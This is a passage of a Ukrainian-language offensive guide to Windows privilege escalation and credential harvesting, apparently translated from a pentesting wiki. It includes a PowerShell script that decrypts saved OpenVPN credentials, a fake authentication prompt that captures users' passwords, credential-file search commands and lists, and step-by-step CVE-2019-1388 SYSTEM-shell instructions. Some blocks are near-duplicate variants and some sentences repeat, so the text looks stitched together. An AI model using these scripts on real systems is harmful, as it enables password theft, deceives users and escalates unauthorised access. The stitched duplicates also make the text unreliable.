### Резервні архіви в кореневому каталозі IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо в кореневому каталозі веб-сайту, може розкрити попередні файли конфігурації та облікові дані, які можна використати повторно. Перевірте налаштований фізичний шлях сайту та чи доступний архів через HTTP, перш ніж вважати це витоком. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише один із можливих варіантів. Швидка локальна інвентаризація дасть змогу переглянути назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет, і не підтверджує, що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **безпосередньо запитувати** клієнта про **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант зі списком імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Розглядайте файл із відповідною назвою як можливе зашифроване сховище; сам факт його наявності не означає, що ви можете його прочитати, розблокувати чи скористатися збереженими обліковими даними. Перевіряючи місця зберігання таких файлів, перегляньте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, також є лише зачіпкою на зашифроване сховище. Щоб розблокувати його, потрібні справжній майстер-пароль і будь-який налаштований ключовий файл чи дані облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте вказаний обліковий запис, а також те, чи є хеш NT актуальним і чи приймає його служба NTLM цільової системи. Сам запис у сховищі не надає прав Administrator або SYSTEM; також мають бути забезпечені віддалений доступ до служби, права облікового запису та будь-який окремий крок виконання коду через службу. В інвентаризації слід зазначати шлях до сховища та можливість його прочитати, а не виводити базу даних чи збережені облікові дані.

Виконайте пошук у всіх запропонованих файлах:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант команди пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані у Кошику

Також перевірте Кошик на наявність облікових даних

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути створена кілька місяців тому й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточної ідентичності прав на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваної резервної копії немає. Розглядайте назву архіву як підставу для перевірки, а не як доказ того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може бути потенційною зачіпкою для **підписання коду**. Якщо він містить доступний закритий ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell вимагає сертифікат для підписання коду із закритим ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють ідентичність підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису поточна ідентичність має мати змогу змінити саме цей сценарій, чинне правило має приймати отриманий підпис для сценарію й цільового облікового запису, а завдання за розкладом або інший процес із вищими привілеями має справді його запускати. Сама назва файлу `.pfx`, тема сертифіката чи доступність сценарію для запису не підтверджують наявності всього цього ланцюжка. Перш ніж відкривати матеріали із закритим ключем або запускати завдання, перевірте метадані, ACL, політику та команду запуску за розкладом.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність потенційних зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися як HTML або TXT, іноді в архіві резервної копії з відповідною назвою. Такі матеріали можуть надати доступ до окремого зашифрованого тому даних зі старішими резервними копіями; перевіряйте том і архів лише за наявності дозволу. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену в автономному режимі також потрібен відповідний вулик `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Назви файлів і заблокований том самі по собі не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Витягування ключів OpenSSH з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та обране в браузерах: можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft описує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити це розташування. Наявність файлів лише вказує на можливе сховище облікових даних: перевірте, чи доступні файли для читання, чи є відповідний контекст DPAPI користувача або інший дозволений ключовий матеріал, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік самих шляхів не потребує відкриття бази даних або виведення розшифрованих паролів.

Для Firefox [Mozilla зазначає](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідні файли ключів і зашифрованих логінів. Їхня наявність лише вказує на можливість отримання облікових даних: перевірте, чи доступні для читання обидва файли, чи є збережені записи та чи захищає ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте його ефективні права керування групами та права групи на [читання або розшифрування паролів LAPS](../active-directory-methodology/laps.md); самі лише артефакти браузера не підтверджують можливість отримати права адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а функціональність кожного компонента надається через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначаються в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей розділ реєстру створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього розділу реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням** із посиланням на **DLL** і значення з назвою **ThreadingModel**, яке може мати значення **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) чи **Neutral** (модель, незалежна від потоків).

![Історія браузерів — COM DLL Overwriting: у CLSID цього розділу реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням із посиланням на DLL і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-які DLL**, які виконуватимуться, то зможете **підвищити привілеї**, якщо цю DLL виконає інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking для закріплення в системі, дивіться:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук умісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном для msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на машині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згаданими на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для отримання паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, який працює від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) **із повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але той успадковує всі відкриті дескриптори основного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор створеного привілейованого процесу**, отриманий через `OpenProcess()`, і **впровадити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Прочитайте також **цю публікацію, де докладніше пояснено, як перевіряти та зловживати відкритими дескрипторами процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **каналами (pipes)**, дають змогу процесам обмінюватися даними.

У Windows є функція **Named Pipes**, яка дозволяє не пов’язаним між собою процесам обмінюватися даними, зокрема через різні мережі. Це схоже на архітектуру клієнт/сервер, у якій ролі визначено як **сервер іменованого каналу** та **клієнт іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який створив цей канал, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Виявивши **привілейований процес**, який обмінюється даними через канал, який ви можете імітувати, ви отримуєте можливість **підвищити привілеї**, перейнявши особу цього процесу, коли він взаємодіятиме зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати комунікацію через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **А цей інструмент дає змогу переглядати список усіх каналів, щоб знаходити способи підвищення привілеїв** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv для RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати шляхом асинхронних подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-байтовий запис** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як служба. Повний ланцюжок дій:

- Викликати `ClientAttach`, вказавши для `pszDomainUser` наявний шлях, доступний для запису → служба відкриє файл через `CreateFileW(..., OPEN_EXISTING)` і використовуватиме його для запису асинхронних подій.
- Кожна подія записує в цей дескриптор контрольоване атакувальником значення `InitContext` із `Initialize`. Зареєструйте застосунок телефонної лінії через `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію та завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, під’єднайтеся знову, а потім викличте `GetUIDllName`, вказавши довільний шлях до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби відображення Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати контрольовані атакувальником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання чи інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди фіксує командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені «NT\AUTHORITY SYSTEM», використовуючи обліковий запис непривілейованого користувача.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час цього процесу, підписаний і виданий Microsoft.

Серед уражених систем:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Для експлуатації цієї вразливості необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та відомості в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Medium до High Integrity Level для Administrator / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та обходи UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-и в директоріях завантаження у веб-корінь

Застосунок може створити передбачуваний підкаталог для завантажень, записати в нього файл із заданим користувачем ім’ям, а потім обробити цей файл. Якщо користувач із низькими привілеями може видалити й замінити цей підкаталог на NTFS junction до запису з боку сервера, запис може перейти за junction у веб-каталог. Розміщений там скрипт може виконуватися від імені вебслужби, якщо сервер виконує файли такого типу. Це специфічна для застосунку межа довільного запису; самі по собі каталог завантажень із правом запису або наявний junction цього не доводять.

Перевірте точне формування шляху й час операцій в обробнику завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить записувач за reparse point, а також чи виконує вебсервер файли в цільовому каталозі. Окремо підтвердьте ідентичності процесів записувача та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse point, але не може встановити поведінку обробника або факт майбутньої підміни junction. Якщо виконання відбувається в контексті облікового запису служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Очищення привілейованого запланованого завдання, ініційоване WNF

Заплановане завдання, яке забороняє ручний запуск, усе одно може мати тригер, доступний непривілейованому користувачу. Під час аудиту привілейованого завдання експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, principal і дію. Зокрема, `WnfStateChangeTrigger` вказує стан Windows Notification Facility (WNF); якщо цей захищений стан дозволяє поточному користувачу публікувати оновлення, користувач може опосередковано запустити завдання з налаштованою для нього ідентичністю, незважаючи на `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` виконувалося від імені SYSTEM, приймало від звичайного користувача оновлення стану WNF `7508BCA32C079E41`, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, знайдіть `ZwUpdateWnfStateData` у `ntdll.dll`, надішліть порожнє оновлення для восьмибайтового імені стану та зіставте статус повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому тесті використано послідовність байтів із прикладу завдання Recall; замініть її на байти, експортовані для завдання, яке перевіряєте.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисний примітив — це не сам тригер, а привілейована процедура очищення, яка приймає каталог, контрольований зловмисником. Простежте операцію від переліку до остаточної зміни: виявлення профілю/сеансу, вибір дочірніх елементів за wildcard, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — вагомі ознаки того, що раніше перевірений шлях згодом рекурсивно обходитиметься. Якщо дочірні елементи не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити розв’язання шляху між його переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із описаною нижче [підміною за допомогою oplock, junction і символічного посилання Object Manager](#from-folder-contents-delete-to-system-eop): oplock призупиняє процедуру очищення після вибору легітимного дочірнього елемента, а потім зловмисник підміняє доступний для запису батьківський каталог, щоб після відновлення привілейоване видалення через `\RPC Control` звернулося до захищеної цілі. У ланцюжку Recall це призвело до видалення `C:\Config.Msi` від імені SYSTEM, необхідного для задокументованого методу відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені дочірні елементи обходять поверхневі виправлення для reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення за шляхом. Залиште ці перевірені об’єкти легітимними й перемістіть підміну junction/oplock до додаткового дочірнього елемента нижче за ієрархією; зрештою `IFileOperation::DeleteItem` дійде до неперевіреного дочірнього елемента й перейде за його новою ціллю. CVE-2026-20941 виникла саме через такий тип неповного виправлення: перший патч Recall перевіряв `UKP` і каталог із назвою у форматі GUID, але залишав стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкривати **кожен дочірній елемент** відносно вже довіреного дескриптора каталогу, отримувати й перевіряти остаточний розв’язаний шлях/об’єкт, а потім застосовувати параметр видалення до цього перевіреного дескриптора. Не перевіряйте префікс шляху, а потім не повертайтеся до рекурсивного видалення за шляхом. Під час перевірки патча також аналізуйте структури безпосередньо в місці виклику: у цьому випадку під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показала ненульове значення `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий висновок декомпілятора про наявність другого примітива `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Метод описано [**у цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлойта [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — зловживання функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмисник має створити **шкідливий інсталятор MSI**, який використає для захоплення папки `C:\Config.Msi`. Згодом Windows Installer використовуватиме її для зберігання файлів відкату під час видалення інших пакетів MSI; ці файли відкату буде змінено так, щоб вони містили шкідливе навантаження.

### Впровадження шляху очищення через COM Windows Installer (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби `msiexec.exe` із привілеями SYSTEM через COM-об’єкт `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення отримані зворотним аналізом і можуть відрізнятися залежно від збірки.<sup>[[41]](#references)</sup>

Для користувача без прав адміністратора `SetEEUIDirectoryAndFilter` видає себе за клієнта лише під час відкриття вказаного шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що клієнт може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

